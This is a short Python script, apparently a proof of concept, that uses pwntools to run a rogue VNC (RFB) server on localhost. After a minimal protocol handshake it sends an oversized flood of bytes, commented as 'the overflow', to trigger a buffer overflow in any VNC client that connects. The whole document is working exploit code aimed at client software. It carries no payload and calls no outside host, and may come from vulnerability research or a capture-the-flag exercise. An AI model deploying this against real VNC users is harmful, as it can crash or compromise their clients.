#!/usr/bin/python3

import socket
from pwn import *
import random

host = "127.0.0.1"
port = random.randint(5555, 6666)

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind((host, port))

print(host + ":" + str(port))

s.listen()
conn, addr = s.accept()

print("Connected from ", addr)

# First send the major and minor
conn.sendall(b"RFB 001.002\n".ljust(0xc, b" "))

# Send the security type
conn.sendall(p32(0x1, endian='big'))

# Now fill si
conn.sendall(p8(0xff)*0x18)

# Now the overflow
conn.sendall(b"M"*0xf0000)


while True:
    data = conn.recv(1024)
    if data:
        print(data)
